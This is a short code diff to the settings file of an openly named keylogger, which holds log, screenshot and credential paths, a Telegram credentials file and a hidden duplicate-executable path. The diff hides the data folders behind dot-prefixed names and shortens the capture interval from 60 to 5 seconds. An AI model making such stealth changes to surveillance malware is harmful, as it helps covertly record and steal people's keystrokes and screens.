@@ -1,11 +1,11 @@
-LOGS_DIR = 'keylogger/logs/'
+LOGS_DIR = '.keylogger/logs/'
 LOG_FILE = 'log.txt'
 LOG_FILE_2 = 'log_processed.txt'
 
-IMG_DIR = 'keylogger/imgs/'
+IMG_DIR = '.keylogger/imgs/'
 IMG_FILE = 'screenshot_'
 
-CREDENTIAL_DIR = 'keylogger/credentials/'
+CREDENTIAL_DIR = '.keylogger/credentials/'
 CREDENTIAL_FILE_TELEGRAM = 'credentials_telegram.json'
 
 DUPLICATE_EXE_DIR = '~/.var/xah/'
@@ -24,4 +24,4 @@ Comment[en_GB]=
 Comment=
 """
 
-TIME_OUT = 60  # period in seconds to capture data
+TIME_OUT = 5  # period in seconds to capture data
